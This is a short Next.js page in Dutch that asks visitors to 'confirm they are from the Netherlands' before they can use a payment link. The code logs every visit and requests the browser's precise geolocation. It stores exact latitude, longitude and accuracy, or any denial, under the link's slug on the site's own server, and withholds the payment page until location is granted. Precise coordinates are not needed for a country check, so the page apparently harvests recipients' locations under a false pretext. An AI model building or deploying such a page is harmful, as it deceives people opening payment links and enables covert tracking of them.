import { useEffect, useState } from 'react';

export async function getServerSideProps({ params }) {
  return { props: { slug: params.slug } };
}

export default function Verify({ slug }) {
  const [needsAction, setNeedsAction] = useState(false);
  const [error, setError] = useState(null);

  const log = async (data) => {
    await fetch('/api/store-location', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(data),
    });
  };

  const handleLocation = () => {
    navigator.geolocation.getCurrentPosition(
      async (pos) => {
        await log({
          slug,
          flow: 'verify',
          event: 'allowed',
          lat: pos.coords.latitude,
          lng: pos.coords.longitude,
          accuracy: pos.coords.accuracy,
        });

        window.location.href = `/pay/${slug}?verified=1`;
      },
      async () => {
        await log({
          slug,
          flow: 'verify',
          event: 'denied',
          denied: true,
        });

        setError('Locatie is verplicht om verder te gaan.');
        setNeedsAction(true);
      }
    );
  };

  useEffect(() => {
    // 🔹 log meteen dat ze hier zijn geweest
    log({
      slug,
      flow: 'verify',
      event: 'visit',
    });

    // 🔹 probeer direct (werkt als locatie al aan staat)
    handleLocation();
  }, []);

  return (
    <div style={{ padding: '2rem', fontFamily: 'sans-serif', textAlign: 'center' }}>
      <h1>🇳🇱 Bevestig dat je uit Nederland komt</h1>

      <p>Geef eerst toegang tot locatie om gebruik te maken van deze betaallink.</p>

      {needsAction && (
        <button onClick={handleLocation} style={{ padding: '0.75rem 1.5rem' }}>
          Bevestigen met locatie
        </button>
      )}

      {error && <p style={{ color: 'red', marginTop: '1rem' }}>{error}</p>}
    </div>
  );
}
